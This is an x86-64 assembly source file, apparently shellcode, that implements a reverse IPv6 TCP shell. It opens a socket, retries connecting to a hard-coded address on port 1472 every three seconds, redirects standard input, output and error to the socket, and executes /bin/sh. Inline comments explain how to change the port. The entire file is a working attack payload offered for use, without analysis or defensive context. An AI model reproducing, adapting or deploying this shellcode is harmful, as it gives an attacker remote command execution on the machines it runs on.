[BITS 64]

;	reverse ip6 tcp shell	
;	
;
;


AF_INET6 	equ 10
SOCK_STREAM equ 1
SOCKET 		equ 41
CONNECT 	equ 42
DUP2 		equ 33
EXECVE 		equ 59
NANOSLEEP 	equ 35

section .text

global _start

_start:

; socket()

push 	AF_INET6
pop 	rdi
push 	SOCK_STREAM
pop 	rsi
xor 	rdx, rdx
push 	SOCKET
pop 	rax
syscall

push 	rax
pop 	rbx

; create struct sockaddr_in6
push  	rdx						;scope id = 0
mov 	rcx, 0x0100000000000000 ;sin6_addr 	for local link use:
push 	rcx                     ;sin6_addr 	0x0100000000000000 
mov 	rcx, 0x0000000000000000 ;sin6_addr 	0x0000000000000000
push 	rcx 					;sin6_addr
mov 	edx, 0xc005FFFF 		;sin6_flowinfo=0 , family=AF_INET6, port=1472 
and 	dx, di 					;to change port change P, 0xPPPP000A
push 	rdx

sleep:

xor 	rsi, rsi
; struct timespec
push 	rsi 		;push 0
push 	3 			;seconds to sleep

; nanosleep()
push 	rsp
pop 	rdi
push 	NANOSLEEP
pop 	rax
syscall

pop 	rcx 		;clear stack
pop 	rcx

; connect()
push 	rbx
pop 	rdi
push 	rsp
pop 	rsi
push 	28 			;sizeof struct
pop 	rdx
push 	CONNECT
pop 	rax
syscall

test 	rax, rax 	;if (rax&rax) ==0	
jnz 	sleep	

; dup2()
xchg 	rsi, rax 	;rsi=0
push 	3
pop 	rsi
dup2:
push 	DUP2
pop 	rax
dec 	rsi
syscall
jnz 	dup2

; execve()
mov 	rdi, 0x68732f6e69622f2f
push 	rsi
push 	rdi
xor 	rdx, rdx
push 	rsp
pop 	rdi
push 	EXECVE 
pop 	rax
syscall

